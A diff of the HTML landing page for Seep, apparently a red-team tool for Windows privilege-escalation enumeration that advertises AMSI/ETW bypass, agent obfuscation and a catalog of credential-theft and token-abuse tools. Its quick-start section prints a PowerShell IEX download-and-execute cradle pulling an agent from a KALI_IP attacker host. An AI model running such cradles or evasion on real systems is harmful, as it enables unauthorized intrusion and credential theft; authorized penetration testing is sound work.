@@ -1,502 +1,223 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Seep — Windows Privilege Escalation Enumeration</title>
-  <meta name="description" content="Windows privilege escalation enumeration framework — 16 checks, 97 tools, MITRE ATT&CK mapping, fileless agent, single-file HTML reports.">
-  <link rel="icon" type="image/svg+xml" href="logo.svg">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <style>
-    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seep — Windows Privilege Escalation Enumeration</title>
+    <meta name="description" content="Windows privilege escalation enumeration framework. 16 checks, 97 tools, MITRE ATT&CK mapping, fileless agent, single-file HTML reports.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #f38ba8; --maroon: #eba0ac; --pink: #f5c2e7; --mauve: #cba6f7;
+            --lavender: #b4befe; --blue: #89b4fa; --sapphire: #74c7ec; --sky: #89dceb;
+            --teal: #94e2d5; --green: #a6e3a1; --yellow: #f9e2af; --peach: #fab387;
+            --text: #cdd6f4; --subtext1: #bac2de; --subtext0: #a6adc8;
+            --overlay2: #9399b2; --overlay1: #7f849c; --overlay0: #6c7086;
+            --surface2: #585b70; --surface1: #45475a; --surface0: #313244;
+            --base: #1e1e2e; --mantle: #181825; --crust: #11111b;
+        }
 
-    :root {
-      --crust: #11111b; --mantle: #181825; --base: #1e1e2e;
-      --surface0: #313244; --surface1: #45475a; --surface2: #585b70;
-      --overlay0: #6c7086; --overlay1: #7f849c;
-      --subtext0: #a6adc8; --subtext1: #bac2de; --text: #cdd6f4;
-      --teal: #94e2d5; --green: #a6e3a1;
-      --red: #f38ba8; --peach: #fab387; --yellow: #f9e2af;
-      --sapphire: #74c7ec;
-    }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
-    html { scroll-behavior: smooth; scrollbar-width: thin; scrollbar-color: var(--surface1) var(--crust); }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--base); color: var(--text); line-height: 1.7; overflow-x: hidden;
+        }
 
-    body {
-      font-family: 'JetBrains Mono', monospace;
-      background: var(--crust);
-      color: var(--text);
-      line-height: 1.7;
-      font-size: 15px;
-      overflow-x: hidden;
-    }
+        body::before {
+            content: ''; position: fixed; inset: 0;
+            background-image: radial-gradient(circle, var(--overlay0) 1px, transparent 1px);
+            background-size: 24px 24px; opacity: 0.15; pointer-events: none; z-index: -1;
+        }
 
-    body::before {
-      content: '';
-      position: fixed; inset: 0;
-      background-image: radial-gradient(var(--surface0) 1px, transparent 1px);
-      background-size: 24px 24px;
-      opacity: 0.25;
-      pointer-events: none;
-      z-index: 0;
-    }
+        body::after {
+            content: ''; position: fixed; inset: 0;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
+            pointer-events: none; z-index: 999; opacity: 0.4;
+        }
 
-    .wrap { position: relative; z-index: 1; max-width: 1080px; margin: 0 auto; padding: 0 24px; }
-    section { margin-bottom: 80px; }
-    a { color: var(--teal); text-decoration: none; transition: color 0.2s; }
-    a:hover { color: var(--green); }
+        ::selection { background: rgba(166, 227, 161, 0.3); color: var(--text); }
 
-    .label {
-      display: inline-block; font-size: 10px; font-weight: 600;
-      letter-spacing: 0.18em; text-transform: uppercase;
-      color: var(--overlay0); border: 1px solid var(--surface1);
-      padding: 4px 12px; border-radius: 2px; margin-bottom: 18px;
-    }
+        code {
+            font-family: 'JetBrains Mono', monospace; background: var(--mantle);
+            padding: 2px 7px; border-radius: 3px; font-size: 0.88em; color: var(--green);
+        }
 
-    .stitle { font-size: clamp(20px, 3vw, 28px); font-weight: 700; color: var(--text); margin-bottom: 10px; line-height: 1.3; }
-    .sdesc { color: var(--subtext0); font-size: 13px; max-width: 580px; margin-bottom: 36px; }
+        .container { max-width: 1140px; margin: 0 auto; padding: 0 28px; }
 
-    /* ===== HERO ===== */
-    .hero { padding: 72px 0 40px; text-align: center; margin-bottom: 56px; }
+        .hero { padding: 100px 0 70px; text-align: center; position: relative; }
+        .hero::after { content: ''; position: absolute; bottom: 0; left: 10%; right: 10%; height: 1px; background: linear-gradient(90deg, transparent, var(--surface1), transparent); }
+        .hero-logo { width: 420px; max-width: 85%; margin: 0 auto 32px; display: block; }
+        .hero-tagline { font-size: 1.35rem; font-weight: 700; color: var(--text); margin-bottom: 16px; }
+        .hero-desc { font-size: 1.02rem; color: var(--subtext0); max-width: 640px; margin: 0 auto 28px; line-height: 1.8; }
+        .hero-warning { display: inline-block; background: rgba(243, 139, 168, 0.08); border: 1px solid rgba(243, 139, 168, 0.2); border-radius: 8px; padding: 10px 20px; font-size: 0.82rem; color: var(--subtext0); margin-bottom: 32px; }
+        .hero-warning strong { color: var(--red); }
+        .stats { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; margin-bottom: 32px; }
+        .stat { display: flex; align-items: center; gap: 8px; background: var(--surface0); border: 1px solid var(--surface1); border-radius: 20px; padding: 6px 16px; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--subtext1); }
+        .stat-dot { width: 8px; height: 8px; border-radius: 50%; }
+        .ctas { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+        .cta { display: inline-flex; align-items: center; gap: 8px; padding: 10px 24px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; font-weight: 600; text-decoration: none; transition: all 0.2s; }
+        .cta-primary { background: linear-gradient(135deg, var(--teal), var(--green)); color: var(--crust); }
+        .cta-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(166, 227, 161, 0.2); }
+        .cta-secondary { background: var(--surface0); color: var(--text); border: 1px solid var(--surface1); }
+        .cta-secondary:hover { border-color: var(--green); color: var(--green); }
 
-    .hero-terminal {
-      border: 1px solid var(--surface1); border-radius: 8px;
-      background: var(--mantle); max-width: 760px; margin: 0 auto;
-      overflow: hidden;
-      box-shadow: 0 0 0 1px var(--surface0), 0 24px 80px -12px rgba(0,0,0,0.5), 0 0 100px -40px rgba(148,226,213,0.06);
-    }
+        .section { padding: 80px 0; position: relative; }
+        .section::before { content: ''; position: absolute; top: 0; left: 10%; right: 10%; height: 1px; background: linear-gradient(90deg, transparent, var(--surface1), transparent); }
+        .section-label { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 3px; color: var(--green); margin-bottom: 8px; }
+        .section-title { font-size: 2rem; font-weight: 700; margin-bottom: 12px; background: linear-gradient(135deg, var(--text), var(--subtext0)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .section-desc { font-size: 1rem; color: var(--overlay2); max-width: 600px; margin-bottom: 40px; }
 
-    .hero-bar {
-      display: flex; align-items: center; gap: 8px;
-      padding: 12px 16px; background: var(--crust); border-bottom: 1px solid var(--surface0);
-    }
+        .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 16px; margin-bottom: 24px; }
+        .feature-card { background: var(--mantle); border: 1px solid var(--surface0); border-radius: 12px; padding: 24px; transition: all 0.25s; }
+        .feature-card:hover { border-color: var(--surface1); transform: translateY(-2px); box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
+        .feature-card h3 { font-size: 1rem; font-weight: 600; margin-bottom: 8px; color: var(--text); }
+        .feature-card p { font-size: 0.88rem; color: var(--overlay2); line-height: 1.7; }
 
-    .dot { width: 12px; height: 12px; border-radius: 50%; }
-    .dot-r { background: var(--red); } .dot-y { background: var(--yellow); } .dot-g { background: var(--green); }
+        .pills { display: flex; flex-wrap: wrap; gap: 8px; }
+        .pill { background: var(--surface0); border: 1px solid var(--surface1); border-radius: 20px; padding: 5px 14px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--subtext0); transition: all 0.2s; }
+        .pill:hover { border-color: var(--green); color: var(--green); }
 
-    .hero-bar-text { flex: 1; text-align: center; font-size: 12px; color: var(--overlay0); letter-spacing: 0.05em; }
+        .arch-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 12px; }
+        .arch-card { background: var(--mantle); border: 1px solid var(--surface0); border-radius: 10px; padding: 20px; }
+        .arch-card h4 { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; font-weight: 600; margin-bottom: 6px; }
+        .arch-card p { font-size: 0.82rem; color: var(--overlay2); line-height: 1.6; }
 
-    .hero-body { padding: 40px 36px 48px; }
+        .terminal { background: var(--mantle); border: 1px solid var(--surface0); border-radius: 12px; overflow: hidden; margin-bottom: 16px; }
+        .terminal-header { background: var(--surface0); padding: 10px 16px; display: flex; align-items: center; gap: 8px; }
+        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .terminal-title { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--overlay2); margin-left: 8px; }
+        .terminal-body { padding: 20px; font-family: 'JetBrains Mono', monospace; font-size: 0.82rem; line-height: 1.9; color: var(--subtext1); overflow-x: auto; }
+        .terminal-body .comment { color: var(--overlay0); }
+        .terminal-body .cmd { color: var(--green); }
+        .terminal-body .flag { color: var(--teal); }
+        .terminal-body .string { color: var(--peach); }
+        .terminal-body .prompt { color: var(--overlay0); }
 
-    .hero-logo { display: block; margin: 0 auto 20px; width: 80px; height: 80px; }
+        .footer { border-top: 1px solid var(--surface0); padding: 48px 0; text-align: center; }
+        .footer-links { display: flex; gap: 24px; justify-content: center; flex-wrap: wrap; margin-bottom: 16px; }
+        .footer-links a { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--overlay2); text-decoration: none; transition: color 0.2s; }
+        .footer-links a:hover { color: var(--green); }
+        .footer-toolkit { font-size: 0.78rem; color: var(--overlay0); margin-bottom: 8px; }
+        .footer-toolkit a { color: var(--overlay1); text-decoration: none; }
+        .footer-toolkit a:hover { color: var(--green); }
+        .footer-brand { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--surface2); }
+        .footer-brand a { color: var(--green); text-decoration: none; }
 
-    .hero-title {
-      font-size: clamp(48px, 8vw, 82px); font-weight: 700; letter-spacing: 14px;
-      background: linear-gradient(90deg, var(--teal), var(--green));
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-      background-clip: text; margin-bottom: 8px;
-    }
-
-    .hero-tagline { font-size: 13px; letter-spacing: 5px; color: var(--subtext0); text-transform: uppercase; margin-bottom: 6px; }
-    .hero-sub { font-size: 11px; letter-spacing: 3px; color: var(--overlay0); }
-
-    .hero-pills { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 28px; }
-
-    .pill {
-      display: inline-flex; align-items: center; gap: 8px;
-      padding: 6px 16px; border-radius: 14px;
-      background: var(--surface0); border: 1px solid var(--surface1);
-      font-size: 11px; color: var(--text); letter-spacing: 0.5px;
-    }
-
-    .pill-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
-
-    .hero-install {
-      margin-top: 32px; padding: 14px 24px; border-radius: 6px;
-      background: var(--base); border: 1px solid var(--surface0);
-      display: inline-block; font-size: 13px; color: var(--green); letter-spacing: 0.5px;
-    }
-
-    .hero-install .prompt { color: var(--overlay0); }
-
-    .hero-links { display: flex; justify-content: center; gap: 16px; margin-top: 24px; }
-
-    .btn {
-      padding: 10px 28px; border-radius: 6px; font-size: 13px; font-weight: 600;
-      font-family: inherit; letter-spacing: 0.5px; transition: all 0.2s; display: inline-block;
-    }
-
-    .btn-primary { background: linear-gradient(135deg, var(--teal), var(--green)); color: var(--crust); }
-    .btn-primary:hover { opacity: 0.9; color: var(--crust); }
-    .btn-outline { border: 1px solid var(--surface1); color: var(--subtext0); background: transparent; }
-    .btn-outline:hover { border-color: var(--teal); color: var(--teal); }
-
-    /* ===== FEATURE GRID ===== */
-    .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; }
-
-    .feat {
-      padding: 28px 24px; border-radius: 8px;
-      background: var(--mantle); border: 1px solid var(--surface0);
-      transition: border-color 0.2s;
-    }
-
-    .feat:hover { border-color: var(--surface1); }
-
-    .feat-icon { font-size: 20px; margin-bottom: 14px; display: block; }
-
-    .feat h3 { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 8px; }
-    .feat p { font-size: 12px; color: var(--subtext0); line-height: 1.6; }
-
-    .feat-accent { color: var(--teal); font-weight: 600; }
-
-    /* ===== CHECKS TABLE ===== */
-    .tbl-wrap { overflow-x: auto; border-radius: 8px; border: 1px solid var(--surface0); }
-
-    table { width: 100%; border-collapse: collapse; font-size: 12px; }
-
-    thead { background: var(--mantle); }
-
-    th {
-      padding: 12px 16px; text-align: left; font-size: 10px;
-      letter-spacing: 0.12em; text-transform: uppercase; color: var(--overlay0);
-      border-bottom: 1px solid var(--surface0); font-weight: 600;
-    }
-
-    td { padding: 10px 16px; border-bottom: 1px solid var(--surface0); color: var(--subtext1); }
-
-    tr:last-child td { border-bottom: none; }
-    tr:hover td { background: rgba(148, 226, 213, 0.02); }
-
-    .sev-crit { color: var(--red); font-weight: 600; }
-    .sev-high { color: var(--peach); font-weight: 600; }
-    .sev-med { color: var(--yellow); }
-    .sev-low { color: var(--green); }
-
-    code {
-      font-family: inherit; font-size: 12px; padding: 2px 7px;
-      background: var(--surface0); border-radius: 3px; color: var(--teal);
-    }
-
-    /* ===== ARCHITECTURE ===== */
-    .arch-box {
-      padding: 28px 32px; border-radius: 8px;
-      background: var(--mantle); border: 1px solid var(--surface0);
-      font-size: 12px; line-height: 1.8; color: var(--subtext0);
-      white-space: pre; overflow-x: auto;
-    }
-
-    .arch-box .hl { color: var(--teal); }
-    .arch-box .hl2 { color: var(--green); }
-    .arch-box .dim { color: var(--overlay0); }
-
-    /* ===== INSTALL ===== */
-    .install-block {
-      padding: 20px 24px; border-radius: 8px;
-      background: var(--base); border: 1px solid var(--surface0);
-      font-size: 13px; line-height: 1.9; margin-bottom: 16px;
-    }
-
-    .install-block .comment { color: var(--overlay0); }
-    .install-block .cmd { color: var(--green); }
-    .install-block .prompt { color: var(--surface2); }
-
-    /* ===== CATALOG ===== */
-    .cat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; }
-
-    .cat-card {
-      padding: 18px 20px; border-radius: 8px;
-      background: var(--mantle); border: 1px solid var(--surface0);
-      transition: border-color 0.2s;
-    }
-
-    .cat-card:hover { border-color: var(--surface1); }
-    .cat-card h4 { font-size: 13px; color: var(--text); margin-bottom: 4px; }
-    .cat-card .count { font-size: 11px; color: var(--teal); margin-bottom: 8px; }
-    .cat-card p { font-size: 11px; color: var(--overlay1); line-height: 1.5; }
-
-    /* ===== FOOTER ===== */
-    footer {
-      text-align: center; padding: 48px 0 40px;
-      border-top: 1px solid var(--surface0); color: var(--overlay0); font-size: 12px;
-    }
-
-    footer .tagline { color: var(--subtext0); margin-bottom: 16px; letter-spacing: 2px; font-size: 13px; }
-    footer .links { display: flex; justify-content: center; gap: 20px; margin-bottom: 12px; }
-    footer .links a { color: var(--overlay1); font-size: 12px; }
-    footer .links a:hover { color: var(--teal); }
-
-    @media (max-width: 600px) {
-      .hero-body { padding: 28px 20px 36px; }
-      .hero-title { letter-spacing: 8px; }
-      .features { grid-template-columns: 1fr; }
-      .cat-grid { grid-template-columns: 1fr; }
-    }
-  </style>
+        @media (max-width: 768px) { .hero { padding: 60px 0 50px; } .hero-logo { width: 280px; } .section-title { font-size: 1.5rem; } .features-grid { grid-template-columns: 1fr; } .arch-grid { grid-template-columns: 1fr 1fr; } }
+        @media (max-width: 480px) { .arch-grid { grid-template-columns: 1fr; } }
+    </style>
 </head>
 <body>
-<div class="wrap">
 
-  <!-- ===== HERO ===== -->
-  <section class="hero">
-    <div class="hero-terminal">
-      <div class="hero-bar">
-        <span class="dot dot-r"></span>
-        <span class="dot dot-y"></span>
-        <span class="dot dot-g"></span>
-        <span class="hero-bar-text">seep v2.0.0</span>
-      </div>
-      <div class="hero-body">
-        <img src="logo.svg" alt="Seep logo" class="hero-logo">
-        <div class="hero-title">SEEP</div>
-        <div class="hero-tagline">Windows Privesc Enumeration</div>
-        <div class="hero-sub">PYTHON &middot; 16 CHECKS &middot; 97 TOOLS &middot; ATT&amp;CK</div>
-
-        <div class="hero-pills">
-          <span class="pill"><span class="pill-dot" style="background:var(--teal)"></span>Fileless Agent</span>
-          <span class="pill"><span class="pill-dot" style="background:var(--green)"></span>MITRE ATT&amp;CK</span>
-          <span class="pill"><span class="pill-dot" style="background:var(--teal)"></span>HTML Reports</span>
-          <span class="pill"><span class="pill-dot" style="background:var(--green)"></span>AES-256 Encrypted</span>
-          <span class="pill"><span class="pill-dot" style="background:var(--teal)"></span>Obfuscation</span>
+    <section class="hero">
+        <div class="container">
+            <img src="assets/logo-dark.svg" alt="Seep" class="hero-logo">
+            <p class="hero-tagline">Windows Privilege Escalation Enumeration</p>
+            <p class="hero-desc">16 enumeration checks, 97-tool catalog, MITRE ATT&CK-mapped recommendations, fileless agent execution, and single-file HTML reports. Water finds every crack -- so does Seep.</p>
+            <div class="hero-warning"><strong>Authorization Required:</strong> This tool is designed exclusively for authorized security testing with explicit written permission.</div>
+            <div class="stats">
+                <div class="stat"><span class="stat-dot" style="background: var(--green)"></span> 16 Checks</div>
+                <div class="stat"><span class="stat-dot" style="background: var(--teal)"></span> 97 Tools</div>
+                <div class="stat"><span class="stat-dot" style="background: var(--green)"></span> MITRE ATT&CK</div>
+                <div class="stat"><span class="stat-dot" style="background: var(--teal)"></span> Fileless Agent</div>
+                <div class="stat"><span class="stat-dot" style="background: var(--green)"></span> AES-256 Encrypted</div>
+            </div>
+            <div class="ctas">
+                <a href="https://github.com/Real-Fruit-Snacks/Seep" class="cta cta-primary">View on GitHub</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Seep#quick-start" class="cta cta-secondary">Quick Start</a>
+            </div>
         </div>
+    </section>
 
-        <div class="hero-install">
-          <span class="prompt">$</span> pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git
+    <section class="section">
+        <div class="container">
+            <div class="section-label">Features</div>
+            <h2 class="section-title">Comprehensive Windows Enumeration</h2>
+            <p class="section-desc">Fileless agent with modular checks, encrypted transport, and actionable MITRE ATT&CK-mapped recommendations.</p>
+            <div class="features-grid">
+                <div class="feature-card"><h3>16 Enumeration Checks</h3><p>Token privileges, unquoted service paths, saved credentials, autoruns, scheduled tasks, registry secrets, DLL hijack candidates -- all producing structured JSON with severity ratings.</p></div>
+                <div class="feature-card"><h3>97-Tool Catalog</h3><p>Organized across 7 categories with SHA256 integrity verification and self-hosted distribution via GitHub Releases. Download, verify, and serve from one CLI.</p></div>
+                <div class="feature-card"><h3>MITRE ATT&CK Mapping</h3><p>Every finding maps to ATT&CK techniques with actionable exploitation guidance, tool suggestions, example commands, and risk ratings sorted by severity.</p></div>
+                <div class="feature-card"><h3>Fileless Execution</h3><p>Agent runs entirely in memory via IEX cradle. Results AES-256-CBC encrypted, compressed, and uploaded. AMSI/ETW/SBL bypassed automatically. Zero disk footprint.</p></div>
+                <div class="feature-card"><h3>Single-File HTML Reports</h3><p>Dark-themed, self-contained HTML -- no CDN, no external requests. Executive summary, per-finding evidence cards, and MITRE recommendations.</p></div>
+                <div class="feature-card"><h3>Agent Obfuscation</h3><p>Cherry-pick checks with <code>--checks</code> / <code>--exclude</code>. Randomize function names, variables, HTTP headers, and check prefixes with <code>--obfuscate</code>.</p></div>
+            </div>
+            <div class="pills">
+                <span class="pill">SeImpersonate</span><span class="pill">Unquoted Paths</span><span class="pill">AutoLogon</span><span class="pill">AlwaysInstallElevated</span><span class="pill">DLL Hijack</span><span class="pill">Registry Secrets</span><span class="pill">Scheduled Tasks</span><span class="pill">AMSI Bypass</span><span class="pill">ETW Bypass</span><span class="pill">AES-256-CBC</span><span class="pill">IEX Cradle</span><span class="pill">SHA256 Verify</span><span class="pill">MITRE ATT&CK</span><span class="pill">HTML Reports</span><span class="pill">IIS Spoofing</span><span class="pill">CSPRNG Obfuscation</span>
+            </div>
         </div>
+    </section>
 
-        <div class="hero-links">
-          <a href="https://github.com/Real-Fruit-Snacks/Seep" class="btn btn-primary">View on GitHub</a>
-          <a href="https://github.com/Real-Fruit-Snacks/Seep#quick-start" class="btn btn-outline">Quick Start</a>
+    <section class="section">
+        <div class="container">
+            <div class="section-label">Architecture</div>
+            <h2 class="section-title">Two-Component Design</h2>
+            <p class="section-desc">Python CLI on the attack box orchestrates everything. Composed PowerShell agent runs on the target.</p>
+            <div class="arch-grid">
+                <div class="arch-card"><h4 style="color: var(--green)">server/agent/</h4><p>16 PowerShell check modules with metadata headers, composer with obfuscation</p></div>
+                <div class="arch-card"><h4 style="color: var(--teal)">server/catalog/</h4><p>97 YAML-defined tools with SHA256, concurrent download manager, symlinks</p></div>
+                <div class="arch-card"><h4 style="color: var(--green)">server/http/</h4><p>Unified HTTP handler for agent delivery, tool serving, and result upload</p></div>
+                <div class="arch-card"><h4 style="color: var(--teal)">server/report/</h4><p>MITRE ATT&CK recommendation engine, HTML/Markdown/JSON generators</p></div>
+            </div>
         </div>
-      </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- ===== HIGHLIGHTS ===== -->
-  <section>
-    <span class="label">Highlights</span>
-    <div class="stitle">What Seep Does</div>
-    <div class="sdesc">A privilege escalation enumeration framework that seeps through Windows security layers to find weaknesses.</div>
+    <section class="section">
+        <div class="container">
+            <div class="section-label">Getting Started</div>
+            <h2 class="section-title">Up and Running in 60 Seconds</h2>
+            <p class="section-desc">Python on the attack box, PowerShell on the target. That's it.</p>
+            <div class="terminal">
+                <div class="terminal-header">
+                    <span class="terminal-dot" style="background: #f38ba8"></span>
+                    <span class="terminal-dot" style="background: #f9e2af"></span>
+                    <span class="terminal-dot" style="background: #a6e3a1"></span>
+                    <span class="terminal-title">deploy.sh</span>
+                </div>
+                <div class="terminal-body">
+                    <span class="comment"># Install</span><br>
+                    <span class="prompt">$</span> <span class="cmd">pipx install</span> <span class="string">git+https://github.com/Real-Fruit-Snacks/Seep.git</span><br><br>
+                    <span class="comment"># Initialize workspace and start server</span><br>
+                    <span class="prompt">$</span> <span class="cmd">seep init</span> <span class="flag">--workdir</span> <span class="string">/tmp/op1</span><br>
+                    <span class="prompt">$</span> <span class="cmd">seep serve</span> <span class="flag">--workdir</span> <span class="string">/tmp/op1</span><br><br>
+                    <span class="comment"># On target (server prints cradles with auth tokens)</span><br>
+                    <span class="prompt">PS&gt;</span> <span class="cmd">IEX(New-Object Net.WebClient).DownloadString</span>(<span class="string">'http://KALI_IP/agent.ps1?token=TOKEN'</span>)<br><br>
+                    <span class="comment"># Generate report</span><br>
+                    <span class="prompt">$</span> <span class="cmd">seep report</span> <span class="string">/tmp/op1/results/results_*.json</span> <span class="flag">--format html</span> <span class="flag">-o</span> <span class="string">report.html</span>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    <div class="features">
-      <div class="feat">
-        <span class="feat-icon">&#x1F50D;</span>
-        <h3>16 Enumeration Checks</h3>
-        <p>Token privileges, unquoted service paths, saved credentials, autoruns, scheduled tasks, registry secrets, DLL hijack candidates, web configs &mdash; all producing structured JSON with severity ratings.</p>
-      </div>
-      <div class="feat">
-        <span class="feat-icon">&#x1F9F0;</span>
-        <h3>97-Tool Catalog</h3>
-        <p>Organized across 7 categories with SHA256 integrity verification and self-hosted distribution via GitHub Releases. Download, verify, and serve from one CLI.</p>
-      </div>
-      <div class="feat">
-        <span class="feat-icon">&#x1F3AF;</span>
-        <h3>MITRE ATT&amp;CK Mapping</h3>
-        <p>Every finding maps to ATT&amp;CK techniques with actionable exploitation guidance, tool suggestions, example commands, and risk ratings sorted by severity.</p>
-      </div>
-      <div class="feat">
-        <span class="feat-icon">&#x1F47B;</span>
-        <h3>Fileless Execution</h3>
-        <p>Agent runs entirely in memory via IEX cradle. Results AES-256-CBC encrypted, compressed, and uploaded over HTTP. AMSI/ETW/SBL bypassed automatically. Zero disk footprint.</p>
-      </div>
-      <div class="feat">
-        <span class="feat-icon">&#x1F4C4;</span>
-        <h3>Single-File HTML Reports</h3>
-        <p>Dark-themed, self-contained HTML &mdash; no CDN, no external requests. Executive summary, per-finding detail with evidence, and remediation guidance.</p>
-      </div>
-      <div class="feat">
-        <span class="feat-icon">&#x1F3AD;</span>
-        <h3>Agent Obfuscation</h3>
-        <p>Cherry-pick checks with <code>--checks</code> / <code>--exclude</code>. Randomize function names, variables, HTTP headers, and check prefixes with <code>--obfuscate</code>.</p>
-      </div>
-    </div>
-  </section>
-
-  <!-- ===== QUICK START ===== -->
-  <section>
-    <span class="label">Quick Start</span>
-    <div class="stitle">Up and Running in 60 Seconds</div>
-    <div class="sdesc">Python on the attack box, PowerShell on the target. That's it.</div>
-
-    <div class="install-block">
-      <span class="comment"># Install</span><br>
-      <span class="prompt">$</span> <span class="cmd">pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git</span><br><br>
-      <span class="comment"># Initialize workspace and start server</span><br>
-      <span class="prompt">$</span> <span class="cmd">seep init --workdir /tmp/op1</span><br>
-      <span class="prompt">$</span> <span class="cmd">seep serve --workdir /tmp/op1</span><br><br>
-      <span class="comment"># On target (server prints ready-to-use cradles with auth tokens)</span><br>
-      <span class="prompt">PS&gt;</span> <span class="cmd">IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')</span><br><br>
-      <span class="comment"># Generate report</span><br>
-      <span class="prompt">$</span> <span class="cmd">seep report /tmp/op1/results/results_*.json --format html -o report.html</span>
-    </div>
-  </section>
-
-  <!-- ===== AGENT CHECKS ===== -->
-  <section>
-    <span class="label">Enumeration</span>
-    <div class="stitle">16 Agent Checks</div>
-    <div class="sdesc">Modular PowerShell scripts with metadata headers &mdash; composable, excludable, obfuscatable.</div>
-
-    <div class="tbl-wrap">
-      <table>
-        <thead>
-          <tr><th>#</th><th>Check</th><th>Description</th><th>OPSEC</th></tr>
-        </thead>
-        <tbody>
-          <tr><td>1</td><td><code>system_info</code></td><td>User context, groups, privileges, local accounts</td><td class="sev-low">Low</td></tr>
-          <tr><td>2</td><td><code>user_privileges</code></td><td>Token privileges &mdash; flags SeImpersonate, SeAssignPrimaryToken</td><td class="sev-low">Low</td></tr>
-          <tr><td>3</td><td><code>network</code></td><td>Interfaces, open ports, connections, routing, firewall</td><td class="sev-low">Low</td></tr>
-          <tr><td>4</td><td><code>patches</code></td><td>Installed KB patches, patch gap analysis</td><td class="sev-low">Low</td></tr>
-          <tr><td>5</td><td><code>quick_wins</code></td><td>PS history, saved credentials (cmdkey), autologon</td><td class="sev-low">Low</td></tr>
-          <tr><td>6</td><td><code>unattend_files</code></td><td>Unattend.xml / sysprep with embedded passwords</td><td class="sev-med">Med</td></tr>
-          <tr><td>7</td><td><code>web_configs</code></td><td>IIS web.config, .NET connection strings</td><td class="sev-med">Med</td></tr>
-          <tr><td>8</td><td><code>services</code></td><td>All services + unquoted service path detection</td><td class="sev-low">Low</td></tr>
-          <tr><td>9</td><td><code>scheduled_tasks</code></td><td>Privileged scheduled tasks with writable scripts</td><td class="sev-low">Low</td></tr>
-          <tr><td>10</td><td><code>autoruns</code></td><td>Registry Run keys, startup folders, writable paths</td><td class="sev-low">Low</td></tr>
-          <tr><td>11</td><td><code>always_install</code></td><td>AlwaysInstallElevated MSI escalation check</td><td class="sev-low">Low</td></tr>
-          <tr><td>12</td><td><code>software</code></td><td>Installed software inventory</td><td class="sev-low">Low</td></tr>
-          <tr><td>13</td><td><code>processes</code></td><td>Running processes with owners and binary paths</td><td class="sev-low">Low</td></tr>
-          <tr><td>14</td><td><code>dll_hijack</code></td><td>Writable directories in system PATH</td><td class="sev-med">Med</td></tr>
-          <tr><td>15</td><td><code>directory_tree</code></td><td>Common paths enumeration</td><td class="sev-low">Low</td></tr>
-          <tr><td>16</td><td><code>registry_secrets</code></td><td>Registry search for stored passwords, keys</td><td class="sev-low">Low</td></tr>
-        </tbody>
-      </table>
-    </div>
-  </section>
-
-  <!-- ===== TOOL CATALOG ===== -->
-  <section>
-    <span class="label">Tools</span>
-    <div class="stitle">97-Tool Catalog</div>
-    <div class="sdesc">Self-hosted via GitHub Releases. SHA256-verified, category-organized, concurrent downloads.</div>
-
-    <div class="cat-grid">
-      <div class="cat-card">
-        <h4>Enumeration</h4>
-        <div class="count">27 tools</div>
-        <p>WinPEAS, SharpUp, Seatbelt, Watson, accesschk, pspy</p>
-      </div>
-      <div class="cat-card">
-        <h4>Credentials</h4>
-        <div class="count">12 tools</div>
-        <p>Mimikatz, LaZagne, SharpDPAPI, SharpChrome, Rubeus, Snaffler</p>
-      </div>
-      <div class="cat-card">
-        <h4>TokenAbuse</h4>
-        <div class="count">10 tools</div>
-        <p>PrintSpoofer, GodPotato, JuicyPotato, SweetPotato, RoguePotato</p>
-      </div>
-      <div class="cat-card">
-        <h4>Active Directory</h4>
-        <div class="count">16 tools</div>
-        <p>SharpHound, Certify, Whisker, PowerView, Kerbrute, KrbRelayUp</p>
-      </div>
-      <div class="cat-card">
-        <h4>Tunneling</h4>
